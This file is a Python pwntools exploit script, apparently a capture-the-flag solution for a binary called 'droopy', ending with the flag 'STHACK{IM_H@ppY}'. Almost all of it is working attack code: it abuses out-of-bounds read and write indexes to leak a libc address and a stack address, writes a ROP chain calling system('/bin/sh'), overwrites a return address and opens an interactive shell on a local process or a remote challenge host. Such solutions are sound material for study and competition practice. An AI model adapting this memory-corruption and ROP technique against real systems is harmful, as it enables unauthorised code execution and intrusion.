from pwn import *
from struct import unpack_from

CMDLINE = ["./droopy_patched"]

elf = ELF(CMDLINE[0], checksec=False)
libc = ELF("./libc-2.39.so", checksec=False)

context.arch = "amd64"

class Exploit:
    LOCAL_HOST = "localhost"
    LOCAL_PORT = 1234
    REMOTE_HOST = "taxpayers.boisson.homeip.net" 
    REMOTE_PORT = 40012

    def __init__(self) -> None:
        if args.REMOTE:
            self.io = remote(self.REMOTE_HOST, self.REMOTE_PORT)
        elif args.LOCAL:
            self.io = remote(self.LOCAL_HOST, self.LOCAL_PORT)
        else:
            self.io = process(CMDLINE)
            if args.DBG:
                print(self.io.pid)
                pause()

    def read(self, idx: int):
        self.io.sendlineafter(b"Write\n", b'1')
        self.io.sendlineafter(b"Index: \n", str(idx).encode())
        self.io.recvline()
        data = self.io.recvuntil(b"\n1 - R", drop=True)
        return data

    def read_u64(self, idx: int):
        data = b""
        for i in range(8):
            data += self.read(idx - i)
        return u64(data[::-1])

    def write(self, idx: int, value: int):
        self.io.sendlineafter(b"Write\n", b'2')
        self.io.sendlineafter(b"Index: \n", str(idx).encode())
        self.io.recvline()
        self.io.send(bytes([value]))

    def write_u64(self, idx: int, value: int):
        for i in range(8):
            self.write(idx + 1 + i, (value >> (8 * i)) & 0xff)

    def interactive(self):
        self.io.interactive()

    def close(self):
        self.io.close()


io = Exploit()

_IO_2_1_stderr_ = io.read_u64(-0x50)
ret_addr = io.read_u64(-0x10) - 0x150

libc.address = _IO_2_1_stderr_ - libc.symbols["_IO_2_1_stderr_"]

print("libc_base   @ %#x" % libc.address)
print("ret_addr    @ %#x" % ret_addr)

add_rsp = libc.address + 0x000000000003f839 # add rsp, 0x28 ; ret
pop_rdi = libc.address + 0x0000000000026265 # pop rdi ; ret
ret = libc.address + 0x000000000002448d # ret


io.write_u64(0x20, pop_rdi)
io.write_u64(0x28, next(libc.search(b"/bin/sh\0")))
io.write_u64(0x30, ret)
io.write_u64(0x38, libc.symbols["system"])

io.write_u64(-0x10, add_rsp)

# change the return address of read() function call in ecrire()
# <_fini+8>:     add    rsp,0x8
# <_fini+12>:    ret
io.write(-0x1f, 0x44) 

io.interactive()
io.close()

# STHACK{IM_H@ppY}